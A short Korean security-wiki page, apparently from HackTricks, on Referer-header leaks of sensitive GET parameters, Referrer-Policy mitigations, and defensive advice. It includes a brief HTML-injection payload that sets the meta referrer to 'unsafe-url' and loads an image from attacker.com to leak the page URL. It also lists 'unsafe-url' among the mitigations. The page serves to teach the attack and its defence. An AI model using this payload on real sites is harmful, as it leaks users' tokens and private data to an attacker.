# 흥미로운 HTTP

{{#include ../banners/hacktricks-training.md}}

## Referrer headers 및 policy

Referrer는 브라우저가 이전에 방문한 페이지를 나타내기 위해 사용하는 header입니다.

### Sensitive information leak

웹 페이지 내에서 어느 시점이든 GET request parameters에 민감한 정보가 포함되어 있고, 해당 페이지에 external sources로 연결되는 링크가 있거나 attacker가 사용자가 attacker가 제어하는 URL을 방문하도록 유도하거나 제안할 수 있는 경우(social engineering), 최신 GET request에 포함된 민감한 정보를 exfiltrate할 수 있습니다.

### 완화

브라우저가 다음과 같은 **Referrer-policy**를 따르도록 설정하여 민감한 정보가 다른 web applications로 전송되는 것을 **방지**할 수 있습니다:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### 대응 우회

HTML meta tag를 사용하여 이 규칙을 재정의할 수 있습니다(공격자는 HTML injection을 악용해야 합니다):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## 방어

URL의 GET parameters 또는 paths 안에 민감한 데이터를 절대 넣지 마세요.

{{#include ../banners/hacktricks-training.md}}
